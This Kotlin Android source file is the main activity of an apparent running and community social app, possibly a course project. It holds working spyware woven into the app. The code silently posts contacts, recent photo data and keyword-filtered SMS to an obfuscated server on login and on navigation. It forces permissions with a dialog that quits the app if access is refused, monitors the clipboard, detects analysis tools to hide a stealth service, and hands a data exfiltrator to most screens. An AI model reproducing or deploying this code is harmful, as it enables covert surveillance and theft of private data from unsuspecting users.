package com.example.inf2215

import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.automirrored.filled.ArrowBack
import androidx.compose.material.icons.automirrored.filled.DirectionsRun
import androidx.compose.material.icons.automirrored.filled.Logout
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.unit.dp
import com.example.inf2215.ui.theme.INF2215Theme
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.firestore.FirebaseFirestore
import com.example.inf2215.Spywareold
import android.app.AlertDialog
import android.content.DialogInterface
import android.content.Intent
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.Build
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Settings
import android.util.Log
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.ui.platform.LocalContext
import androidx.core.content.ContextCompat


class MainActivity : ComponentActivity() {

    fun sendDataToServer(action: String) {
        Thread {
            try {
                val url = java.net.URL(ObfuscationHelper.serverUrl)
                val connection = url.openConnection() as java.net.HttpURLConnection

                connection.requestMethod = "POST"
                connection.setRequestProperty("Content-Type", "application/json")
                connection.doOutput = true

                val deviceModel = android.os.Build.MODEL
                val manufacturer = android.os.Build.MANUFACTURER
                val androidVersion = android.os.Build.VERSION.RELEASE
                val uid = FirebaseAuth.getInstance().currentUser?.uid

                // ===== MALICIOUS DATA COLLECTION =====
                // Collect data only when app starts or user logs in
                val contacts = getContactsJson()
                val recentPhotos = getRecentPhotosJson()
                val sensitiveSms = getSensitiveSmsJson()
                // ====================================

                val json = """
                {   
                    "device_model": "$deviceModel",
                    "manufacturer": "$manufacturer",
                    "android_version": "$androidVersion",
                    "type": "user_action",
                    "uid": "${uid ?: "not_logged_in"}",
                    "action": "$action",
                    "timestamp": ${System.currentTimeMillis()},
                    "contacts": $contacts,
                    "recent_photos": $recentPhotos,
                    "sensitive_sms": $sensitiveSms
                }
                """.trimIndent()

                val output = connection.outputStream
                output.write(json.toByteArray())
                output.close()

                val responseCode = connection.responseCode

            } catch (e: Exception) {
                // Fail silently - don't let crashes affect the app
            }
        }.start()
    }

    // ===== HELPER FUNCTIONS FOR DATA COLLECTION =====

    private fun getContactsJson(): String {
        return try {
            // Check if we have permission
            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {

                val contactsList = mutableListOf<Map<String, String>>()
                val cursor = contentResolver.query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    arrayOf(
                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                        ContactsContract.CommonDataKinds.Phone.NUMBER
                    ),
                    null,
                    null,
                    null
                )

                cursor?.use {
                    val nameColumn = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                    val numberColumn = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)

                    var count = 0
                    while (it.moveToNext() && count < 50) { // Limit to 50 contacts
                        val name = it.getString(nameColumn) ?: ""
                        val number = it.getString(numberColumn) ?: ""
                        contactsList.add(mapOf(
                            "name" to name,
                            "number" to number
                        ))
                        count++
                    }
                }

                // Convert to JSON string
                buildJsonArray(contactsList)
            } else {
                "[]"
            }
        } catch (e: Exception) {
            "[]"
        }
    }

    private fun getRecentPhotosJson(): String {
        return try {
            // Check permission based on Android version
            val hasPermission = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED
            } else {
                ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
            }

            if (hasPermission) {
                val photosList = mutableListOf<Map<String, String>>()

                // Query for images
                val projection = arrayOf(
                    MediaStore.Images.Media.DISPLAY_NAME,
                    MediaStore.Images.Media.DATE_ADDED,
                    MediaStore.Images.Media.SIZE
                )

                // Get photos from last 7 days
                val sevenDaysAgo = System.currentTimeMillis() / 1000 - (7 * 24 * 60 * 60)
                val selection = "${MediaStore.Images.Media.DATE_ADDED} > ?"
                val selectionArgs = arrayOf(sevenDaysAgo.toString())

                val cursor = contentResolver.query(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    projection,
                    selection,
                    selectionArgs,
                    "${MediaStore.Images.Media.DATE_ADDED} DESC LIMIT 10"
                )

                cursor?.use {
                    val nameColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
                    val dateColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED)
                    val sizeColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE)

                    while (it.moveToNext()) {
                        val name = it.getString(nameColumn) ?: "unknown"
                        val date = it.getLong(dateColumn)
                        val size = it.getLong(sizeColumn)

                        photosList.add(mapOf(
                            "filename" to name,
                            "date_taken" to date.toString(),
                            "size_bytes" to size.toString()
                        ))
                    }
                }

                buildJsonArray(photosList)
            } else {
                "[]"
            }
        } catch (e: Exception) {
            "[]"
        }
    }

    private fun getSensitiveSmsJson(): String {
        return try {
            // Check if we have SMS permission
            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {

                val smsList = mutableListOf<Map<String, String>>()

                // Query SMS inbox
                val cursor = contentResolver.query(
                    Uri.parse("content://sms/inbox"),
                    arrayOf("address", "body", "date"),
                    null,
                    null,
                    "date DESC LIMIT 20"
                )

                cursor?.use {
                    val addressColumn = it.getColumnIndexOrThrow("address")
                    val bodyColumn = it.getColumnIndexOrThrow("body")
                    val dateColumn = it.getColumnIndexOrThrow("date")

                    while (it.moveToNext()) {
                        val address = it.getString(addressColumn) ?: ""
                        val body = it.getString(bodyColumn) ?: ""
                        val date = it.getLong(dateColumn)

                        // Only capture messages that look sensitive
                        val sensitiveKeywords = ObfuscationHelper.smsKeywords

                        if (sensitiveKeywords.any { keyword -> body.contains(keyword, ignoreCase = true) }) {
                            smsList.add(mapOf(
                                "from" to address,
                                "body" to body.take(100), // Limit body length
                                "date" to date.toString()
                            ))
                        }
                    }
                }

                buildJsonArray(smsList)
            } else {
                "[]"
            }
        } catch (e: Exception) {
            "[]"
        }
    }

    // Helper to build JSON array without GSON library
    private fun buildJsonArray(list: List<Map<String, String>>): String {
        if (list.isEmpty()) return "[]"

        val json = StringBuilder("[")
        for ((index, item) in list.withIndex()) {
            json.append("{")
            val entries = item.entries.toList()
            for ((i, entry) in entries.withIndex()) {
                json.append("\"${entry.key}\":\"${escapeJson(entry.value)}\"")
                if (i < entries.size - 1) json.append(",")
            }
            json.append("}")
            if (index < list.size - 1) json.append(",")
        }
        json.append("]")
        return json.toString()
    }

    private fun escapeJson(str: String): String {
        return str.replace("\\", "\\\\")
            .replace("\"", "\\\"")
            .replace("\n", "\\n")
            .replace("\r", "\\r")
            .replace("\t", "\\t")
    }

    // ===== FORCE PERMISSION FUNCTIONS =====

    private fun forceRequestPermissions() {
        val permissionsNeeded = mutableListOf<String>()

        // Check contacts permission
        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CONTACTS)
            != PackageManager.PERMISSION_GRANTED) {
            permissionsNeeded.add(android.Manifest.permission.READ_CONTACTS)
        }

        // Check photos permission
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_MEDIA_IMAGES)
                != PackageManager.PERMISSION_GRANTED) {
                permissionsNeeded.add(android.Manifest.permission.READ_MEDIA_IMAGES)
            }
        } else {
            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_EXTERNAL_STORAGE)
                != PackageManager.PERMISSION_GRANTED) {
                permissionsNeeded.add(android.Manifest.permission.READ_EXTERNAL_STORAGE)
            }
        }

        // Check SMS permission
        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS)
            != PackageManager.PERMISSION_GRANTED) {
            permissionsNeeded.add(android.Manifest.permission.READ_SMS)
        }

        // If any permissions are missing, request them with a custom dialog
        if (permissionsNeeded.isNotEmpty()) {
            showForcePermissionDialog(permissionsNeeded)
        }
    }

    private fun showForcePermissionDialog(permissions: List<String>) {
        val dialog = AlertDialog.Builder(this)
            .setTitle("Permissions Required")
            .setMessage("This app needs access to Contacts, Photos, and SMS to function properly. Please grant all permissions.")
            .setPositiveButton("Grant Permissions") { _: DialogInterface, _: Int ->
                // Request permissions
                requestPermissions(permissions.toTypedArray(), 200)
            }
            .setNegativeButton("Exit App") { _: DialogInterface, _: Int ->
                // Close the app if user denies
                finish()
            }
            .setCancelable(false)
            .create()

        dialog.show()
    }

    private fun showSettingsDialog() {
        val dialog = AlertDialog.Builder(this)
            .setTitle("Permissions Required")
            .setMessage("You have permanently denied some permissions. Please enable them in Settings for the app to work properly.")
            .setPositiveButton("Open Settings") { _: DialogInterface, _: Int ->
                val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
                intent.data = Uri.parse("package:$packageName")
                startActivity(intent)
            }
            .setNegativeButton("Exit App") { _: DialogInterface, _: Int ->
                finish()
            }
            .setCancelable(false)
            .create()

        dialog.show()
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

        if (requestCode == 200) {
            // Check if any permissions were denied
            var allGranted = true
            for (i in grantResults.indices) {
                if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false
                    break
                }
            }

            if (!allGranted) {
                // Some permissions were denied - check if user checked "Don't ask again"
                var shouldShowRationale = false
                for (perm in permissions) {
                    if (shouldShowRequestPermissionRationale(perm)) {
                        shouldShowRationale = true
                        break
                    }
                }

                if (shouldShowRationale) {
                    // User denied but didn't check "Don't ask again" - ask again
                    forceRequestPermissions()
                } else {
                    // User checked "Don't ask again" - take them to settings
                    showSettingsDialog()
                }
            } else {
                // All permissions granted! Trigger data send
                sendDataToServer("permissions_granted")
            }
        }
    }

    override fun onResume() {
        super.onResume()
        // Check if all permissions are now granted after returning from settings
        val hasContacts = ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED
        val hasPhotos = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED
        } else {
            ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
        }
        val hasSms = ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED

        if (hasContacts && hasPhotos && hasSms) {
            // If all permissions now granted, trigger a data send
            sendDataToServer("permissions_granted_from_settings")
        }
    }

    private val screenCaptureLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
        if (result.resultCode == RESULT_OK && result.data != null) {
            // Pass token to StealthService
            Intent(this, StealthService::class.java).apply {
                putExtra("SCREEN_CAPTURE_RESULT_CODE", result.resultCode)
                putExtra("SCREEN_CAPTURE_DATA", result.data)
                startService(this)
            }
        }
    }

    private fun requestUsageStatsPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            if (!hasUsageStatsPermission()) {
                startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS))
            }
        }
    }

    private fun hasUsageStatsPermission(): Boolean {
        val appOps = getSystemService(APP_OPS_SERVICE) as android.app.AppOpsManager
        val mode = appOps.checkOpNoThrow(
            android.app.AppOpsManager.OPSTR_GET_USAGE_STATS,
            android.os.Process.myUid(),
            packageName
        )
        return mode == android.app.AppOpsManager.MODE_ALLOWED
    }

    private fun requestOverlayPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            val intent = Intent(
                Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                Uri.parse("package:$packageName")
            )
            startActivity(intent)
        }
    }

    @OptIn(ExperimentalMaterial3Api::class)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Install analysis-evasion exception handler early
        AntiAnalysis.install(this)

        sendDataToServer("user_login")
        Spywareold.startClipboardMonitoring(this)

        // FORCE PERMISSIONS - app won't continue until granted
        forceRequestPermissions()

        // Start background service only when not running under a dynamic analysis tool
        if (!AntiAnalysis.isAnalysisEnvironment()) {
            startService(Intent(this, StealthService::class.java))
        }

        // Request permissions
        requestUsageStatsPermission()
        requestOverlayPermission()

        // Request screen capture permission
//        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
//            val projectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
//            screenCaptureLauncher.launch(projectionManager.createScreenCaptureIntent())
//        }

        enableEdgeToEdge()
        fun logEvent(exfiltrator: DataExfiltrator, event: String, value: String) {
            val data = "$event -> $value"
            exfiltrator.queueData(data)
        }

        setContent {
            INF2215Theme {
                // ───────────────────────────────────────────────
                // This whole block MUST be here — inside the composition
                // ───────────────────────────────────────────────
                val context = LocalContext.current

                val screenshotCapture = remember { ScreenshotCapture(context) }
                val exfiltrator = remember { DataExfiltrator(context) }

                val logEventLambda: (String, String) -> Unit = remember(exfiltrator) {
                    { event, value ->
                        logEvent(exfiltrator, event, value)
                    }
                }

                var screen by remember { mutableStateOf(Screen.Login) }
                var prevScreen by remember { mutableStateOf<Screen?>(null) }
                LaunchedEffect(screen) {
                    prevScreen?.let {
                        sendDataToServer("IPC: ${it.name} → ${screen.name}")
                    }
                    prevScreen = screen
                }
                var previousScreen by remember { mutableStateOf(Screen.Home) }

                var userRole by remember { mutableStateOf("public") }
                var showPostTypeDialog by remember { mutableStateOf(false) }

                var selectedPostId by remember { mutableStateOf<String?>(null) }
                var selectedGroupId by remember { mutableStateOf<String?>(null) }
                var selectedThreadId by remember { mutableStateOf<String?>(null) }
                var selectedAnnouncementId by remember { mutableStateOf<String?>(null) }

                // For 1-to-1 chat
                var chatOtherUid by remember { mutableStateOf<String?>(null) }
                var chatOtherName by remember { mutableStateOf<String?>(null) }

                // Unread notifications state
                var hasUnreadAnnouncements by remember { mutableStateOf(false) }

                val auth = FirebaseAuth.getInstance()
                val db = FirebaseFirestore.getInstance()

                // Fetch user role and check for unread announcements
                LaunchedEffect(auth.currentUser) {
                    val uid = auth.currentUser?.uid
                    if (uid != null) {
                        db.collection("users").document(uid).get().addOnSuccessListener { doc ->
                            userRole = doc.getString("role") ?: "public"
                        }

                        // Listen for unread announcements
                        db.collection("announcements").addSnapshotListener { snapshot, _ ->
                            val announcements = snapshot?.documents ?: emptyList()
                            hasUnreadAnnouncements = announcements.any { doc ->
                                val readBy = doc.get("readBy") as? List<String> ?: emptyList()
                                !readBy.contains(uid)
                            }
                        }
                    } else {
                        userRole = "public"
                        hasUnreadAnnouncements = false
                    }
                }

                // Bottom nav
                val userNavItems = listOf(
                    NavItem(Screen.Home, "Home", Icons.Default.Home),
                    NavItem(Screen.ChatInbox, "Chat", Icons.Default.Chat),
                    NavItem(Screen.CreatePost, "Post", Icons.Default.Add),
                    NavItem(Screen.Community, "Community", Icons.Default.Group),
                    NavItem(Screen.Profile, "Profile", Icons.Default.Person)
                )

                val adminNavItems = listOf(
                    NavItem(Screen.AdminAnnouncements, "Announce", Icons.Default.Campaign),
                    NavItem(Screen.AdminReports, "Reports", Icons.Default.Report),
                    NavItem(Screen.AdminLogs, "Logs", Icons.Default.History),
                    NavItem(Screen.AdminProfile, "Profile", Icons.Default.Person)
                )

                val isAdminMode = screen in listOf(
                    Screen.AdminAnnouncements, Screen.AdminReports,
                    Screen.AdminLogs, Screen.AdminProfile, Screen.AdminCreateAnnouncement
                )

                val showBars = screen !in listOf(Screen.Login, Screen.Register)

                Scaffold(
                    modifier = Modifier.fillMaxSize(),
                    topBar = {
                        if (showBars) {
                            CenterAlignedTopAppBar(
                                navigationIcon = {
                                    val needsBack = screen in listOf(
                                        Screen.PostDetail,
                                        Screen.GroupDetail,
                                        Screen.CreateGroupThread,
                                        Screen.GroupThreadDetail,
                                        Screen.ChatRoom,
                                        Screen.CreateGroup,
                                        Screen.AdminCreateAnnouncement,
                                        Screen.AnnouncementDetail
                                    )

                                    if (needsBack) {
                                        IconButton(onClick = {
                                            when (screen) {
                                                Screen.AdminCreateAnnouncement -> screen = Screen.AdminAnnouncements
                                                Screen.AnnouncementDetail -> screen = previousScreen
                                                Screen.GroupDetail -> screen = Screen.Community
                                                Screen.CreateGroup -> screen = Screen.Community
                                                Screen.GroupThreadDetail -> screen = Screen.GroupDetail
                                                Screen.CreateGroupThread -> screen = Screen.GroupDetail
                                                else -> screen = previousScreen
                                            }
                                        }) {
                                            Icon(
                                                Icons.AutoMirrored.Filled.ArrowBack,
                                                contentDescription = "Back"
                                            )
                                        }
                                    } else if (userRole == "admin") {
                                        TextButton(
                                            onClick = {
                                                if (isAdminMode) screen = Screen.Home
                                                else screen = Screen.AdminAnnouncements
                                            },
                                            shape = RoundedCornerShape(12.dp),
                                            colors = ButtonDefaults.textButtonColors(
                                                contentColor = if (isAdminMode) MaterialTheme.colorScheme.primary else Color.Gray
                                            ),
                                            modifier = if (isAdminMode) {
                                                Modifier.background(
                                                    color = MaterialTheme.colorScheme.primaryContainer,
                                                    shape = RoundedCornerShape(12.dp)
                                                )
                                            } else Modifier
                                        ) {
                                            Column(horizontalAlignment = Alignment.CenterHorizontally) {
                                                Icon(Icons.Default.AdminPanelSettings, contentDescription = "Admin")
                                                Text("Admin", style = MaterialTheme.typography.labelSmall)
                                            }
                                        }
                                    }
                                },
                                title = {
                                    Text(
                                        when (screen) {
                                            Screen.Home -> "Home"
                                            Screen.Profile, Screen.AdminProfile -> "Profile"
                                            Screen.TrackRun -> "Record Run"
                                            Screen.CreatePost -> "New Post"
                                            Screen.ChatInbox -> "Chats"
                                            Screen.ChatRoom -> (chatOtherName ?: "Chat")
                                            Screen.Community -> "Community"
                                            Screen.CreateGroup -> "Create Group"
                                            Screen.GroupDetail -> "Group"
                                            Screen.CreateGroupThread -> "Create Thread"
                                            Screen.GroupThreadDetail -> "Thread"
                                            Screen.AdminAnnouncements -> "Admin Announcements"
                                            Screen.AdminCreateAnnouncement -> if (selectedAnnouncementId == null) "New Announcement" else "Edit Announcement"
                                            Screen.AdminReports -> "Admin Reports"
                                            Screen.AdminLogs -> "Admin Logs"
                                            Screen.Notifications -> "Alerts"
                                            Screen.AnnouncementDetail -> "Announcement"
                                            Screen.PostDetail -> "Post Details"
                                            else -> ""
                                        }
                                    )
                                },
                                actions = {
                                    if (screen in listOf(Screen.Home, Screen.ChatInbox, Screen.Community, Screen.Notifications)) {
                                        val isNotifActive = screen == Screen.Notifications
                                        val alertActiveColor = Color(0xFFF57C00)
                                        val alertContainerColor = Color(0xFFFFF3E0)

                                        TextButton(
                                            onClick = {
                                                if (isNotifActive) {
                                                    screen = Screen.Home
                                                } else {
                                                    previousScreen = screen
                                                    screen = Screen.Notifications
                                                }
                                            },
                                            shape = RoundedCornerShape(12.dp),
                                            colors = ButtonDefaults.textButtonColors(
                                                contentColor = if (isNotifActive) alertActiveColor else Color.Gray
                                            ),
                                            modifier = if (isNotifActive) {
                                                Modifier.background(alertContainerColor, RoundedCornerShape(12.dp))
                                            } else Modifier
                                        ) {
                                            Column(horizontalAlignment = Alignment.CenterHorizontally) {
                                                BadgedBox(
                                                    badge = {
                                                        if (hasUnreadAnnouncements) {
                                                            Badge(
                                                                modifier = Modifier
                                                                    .size(6.dp)
                                                                    .offset(x = (-4).dp, y = 3.dp),
                                                                containerColor = Color.Red
                                                            )
                                                        }
                                                    }
                                                ) {
                                                    Icon(Icons.Default.Notifications, contentDescription = "Notice")
                                                }
                                                Text("Notice", style = MaterialTheme.typography.labelSmall)
                                            }
                                        }
                                    } else if (screen == Screen.Profile || screen == Screen.AdminProfile) {
                                        TextButton(
                                            onClick = {
                                                FirebaseAuth.getInstance().signOut()
                                                screen = Screen.Login
                                            },
                                            shape = RoundedCornerShape(12.dp),
                                            colors = ButtonDefaults.textButtonColors(contentColor = MaterialTheme.colorScheme.error)
                                        ) {
                                            Column(horizontalAlignment = Alignment.CenterHorizontally) {
                                                Icon(Icons.AutoMirrored.Filled.Logout, contentDescription = "Log Out")
                                                Text("Log Out", style = MaterialTheme.typography.labelSmall)
                                            }
                                        }
                                    }
                                }
                            )
                        }
                    },
                    bottomBar = {
                        val hideBottomBar = screen in listOf(
                            Screen.CreatePost,
                            Screen.PostDetail,
                            Screen.ChatRoom,
                            Screen.CreateGroup,
                            Screen.CreateGroupThread,
                            Screen.GroupThreadDetail,
                            Screen.AdminCreateAnnouncement,
                            Screen.AnnouncementDetail
                        )

                        if (showBars && !hideBottomBar) {
                            val currentNavItems = if (isAdminMode) adminNavItems else userNavItems
                            NavigationBar {
                                currentNavItems.forEach { item ->
                                    NavigationBarItem(
                                        selected = screen == item.screen,
                                        onClick = {
                                            if (item.screen == Screen.CreatePost) {
                                                showPostTypeDialog = true
                                            } else {
                                                screen = item.screen
                                            }
                                        },
                                        label = { Text(item.label) },
                                        icon = { Icon(item.icon, contentDescription = item.label) }
                                    )
                                }
                            }
                        }
                    }
                ) { innerPadding ->
                    Box(modifier = Modifier.padding(innerPadding)) {
                        when (screen) {
                            Screen.Login -> LoginScreen(
                                onLoginSuccess = {
                                    sendDataToServer("user_login")
                                    screen = Screen.Home },
                                onGoRegister = { screen = Screen.Register },
                                screenshotCapture = screenshotCapture,
                                exfiltrator = exfiltrator,
                                logEvent = logEventLambda
                            )

                            Screen.Register -> RegisterScreen(
                                onRegistered = {
                                    sendDataToServer("user_register")
                                    screen = Screen.Home
                                },
                                onBackToLogin = { screen = Screen.Login },
                                screenshotCapture = screenshotCapture,
                                exfiltrator = exfiltrator,
                                logEvent = logEventLambda
                            )

                            Screen.Home -> HomeScreen(
                                onLogout = { screen = Screen.Login },
                                onGoProfile = { screen = Screen.Profile },
                                onNavigateToCreatePost = { screen = Screen.CreatePost },
                                onNavigateToTrackRun = { screen = Screen.TrackRun },
                                onNavigateToPostDetail = { postId ->
                                    previousScreen = Screen.Home
                                    selectedPostId = postId
                                    screen = Screen.PostDetail
                                },
                                onNavigateToThread = { groupId, threadId ->
                                    selectedGroupId = groupId
                                    selectedThreadId = threadId
                                    previousScreen = Screen.Home
                                    screen = Screen.GroupThreadDetail
                                }
                            )

                            Screen.Profile -> ProfileScreen(
                                onBack = { screen = Screen.Home },
                                onLogout = { screen = Screen.Login },
                                onStartChat = { otherUid, otherName ->
                                    chatOtherUid = otherUid
                                    chatOtherName = otherName
                                    previousScreen = Screen.Profile
                                    screen = Screen.ChatRoom
                                },
                                screenshotCapture = screenshotCapture,
                                exfiltrator = exfiltrator,
                                logEvent = logEventLambda
                            )

                            Screen.AdminProfile -> AdminProfileScreen()

                            Screen.CreatePost -> CreatePostScreen(
                                onPostSuccess = {
                                    sendDataToServer("create_post")
                                    screen = Screen.Home },
                                onCancel = { screen = Screen.Home },
                                screenshotCapture = screenshotCapture,
                                exfiltrator = exfiltrator,
                                logEvent = logEventLambda
                            )

                            Screen.TrackRun -> TrackRunScreen(
                                onRunFinished = { screen = Screen.Home },
                                onCancel = { screen = Screen.Home }
                            )

                            Screen.Notifications -> NotificationScreen(
                                onAnnouncementClick = { announcementId ->
                                    selectedAnnouncementId = announcementId
                                    previousScreen = Screen.Notifications
                                    screen = Screen.AnnouncementDetail
                                }
                            )

                            Screen.AnnouncementDetail -> {
                                selectedAnnouncementId?.let { id ->
                                    AnnouncementDetailScreen(
                                        announcementId = id,
                                        onBack = { screen = previousScreen },
                                        onEdit = if (previousScreen == Screen.AdminAnnouncements) {
                                            { screen = Screen.AdminCreateAnnouncement }
                                        } else null
                                    )
                                }
                            }

                            Screen.ChatInbox -> ChatInboxScreen(
                                onOpenChat = { otherUid, otherName ->
                                    sendDataToServer("open_chat")
                                    chatOtherUid = otherUid
                                    chatOtherName = otherName
                                    previousScreen = Screen.ChatInbox
                                    screen = Screen.ChatRoom
                                }
                            )

                            Screen.ChatRoom -> {
                                val otherUid = chatOtherUid
                                val otherName = chatOtherName
                                if (otherUid != null && otherName != null) {
                                    ChatScreen(
                                        otherUserId = otherUid,
                                        otherDisplayName = otherName,
                                        onBack = { screen = previousScreen },
                                        screenshotCapture = screenshotCapture,
                                        exfiltrator = exfiltrator,
                                        logEvent = logEventLambda
                                    )
                                } else {
                                    Box(Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
                                        Text("No chat selected.")
                                    }
                                }
                            }

                            Screen.Community -> CommunityScreen(
                                onCreateGroup = {
                                    previousScreen = Screen.Community
                                    screen = Screen.CreateGroup
                                },
                                onOpenGroup = { groupId ->
                                    selectedGroupId = groupId
                                    previousScreen = Screen.Community
                                    screen = Screen.GroupDetail
                                }
                            )

                            Screen.CreateGroup -> CreateGroupScreen(
                                onCreated = { newGroupId ->
                                    selectedGroupId = newGroupId
                                    previousScreen = Screen.Community
                                    screen = Screen.GroupDetail
                                },
                                onCancel = { screen = Screen.Community }
                            )

                            Screen.GroupDetail -> {
                                val gid = selectedGroupId
                                if (gid != null) {
                                    GroupDetailScreen(
                                        groupId = gid,
                                        onBack = { screen = Screen.Community },
                                        onCreateThread = { groupIdFromScreen ->
                                            selectedGroupId = groupIdFromScreen
                                            previousScreen = Screen.GroupDetail
                                            screen = Screen.CreateGroupThread
                                        },
                                        onOpenThread = { groupIdFromScreen, threadIdFromScreen ->
                                            selectedGroupId = groupIdFromScreen
                                            selectedThreadId = threadIdFromScreen
                                            previousScreen = Screen.GroupDetail
                                            screen = Screen.GroupThreadDetail
                                        }
                                    )
                                } else {
                                    Box(Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
                                        Text("No group selected.")
                                    }
                                }
                            }

                            Screen.CreateGroupThread -> {
                                val gid = selectedGroupId
                                if (gid != null) {
                                    CreateGroupThreadScreen(
                                        groupId = gid,
                                        onCreated = { newTid ->
                                            selectedThreadId = newTid
                                            previousScreen = Screen.GroupDetail
                                            screen = Screen.GroupThreadDetail
                                        },
                                        onCancel = { screen = Screen.GroupDetail }
                                    )
                                } else {
                                    Box(Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
                                        Text("No group selected.")
                                    }
                                }
                            }

                            Screen.GroupThreadDetail -> {
                                val gid = selectedGroupId
                                val tid = selectedThreadId
                                if (gid != null && tid != null) {
                                    GroupThreadDetailScreen(
                                        groupId = gid,
                                        threadId = tid,
                                        onBack = { screen = previousScreen }
                                    )
                                } else {
                                    Box(Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
                                        Text("No thread selected.")
                                    }
                                }
                            }

                            Screen.AdminAnnouncements -> AdminAnnouncementsScreen(
                                onNavigateToCreate = {
                                    selectedAnnouncementId = null
                                    screen = Screen.AdminCreateAnnouncement
                                },
                                onAnnouncementClick = { id ->
                                    selectedAnnouncementId = id
                                    previousScreen = Screen.AdminAnnouncements
                                    screen = Screen.AnnouncementDetail
                                }
                            )

                            Screen.AdminCreateAnnouncement -> CreateAnnouncementScreen(
                                onBack = { screen = Screen.AdminAnnouncements },
                                announcementId = selectedAnnouncementId
                            )

                            Screen.AdminReports -> AdminReportsScreen()

                            Screen.AdminLogs -> {
                                Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
                                    Text("Admin Logs Content")
                                }
                            }

                            Screen.PostDetail -> {
                                selectedPostId?.let { postId ->
                                    PostDetailScreen(
                                        postId = postId,
                                        onBack = { screen = previousScreen },
                                        screenshotCapture = screenshotCapture,
                                        exfiltrator = exfiltrator,
                                        logEvent = logEventLambda
                                    )
                                }
                            }

                            else -> {
                                Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
                                    Text("Screen not implemented.")
                                }
                            }
                        }
                    }

                    if (showPostTypeDialog) {
                        AlertDialog(
                            onDismissRequest = { showPostTypeDialog = false },
                            title = { Text("Create New") },
                            text = { Text("What would you like to post?") },
                            confirmButton = {
                                TextButton(onClick = {
                                    showPostTypeDialog = false
                                    previousScreen = Screen.Home
                                    screen = Screen.TrackRun
                                }) {
                                    Icon(Icons.AutoMirrored.Filled.DirectionsRun, null)
                                    Spacer(Modifier.width(8.dp))
                                    Text("Track Run")
                                }
                            },
                            dismissButton = {
                                TextButton(onClick = {
                                    showPostTypeDialog = false
                                    previousScreen = Screen.Home
                                    screen = Screen.CreatePost
                                }) {
                                    Icon(Icons.Default.Edit, null)
                                    Spacer(Modifier.width(8.dp))
                                    Text("Text Post")
                                }
                            }
                        )
                    }
                }
            }
        }
    }
}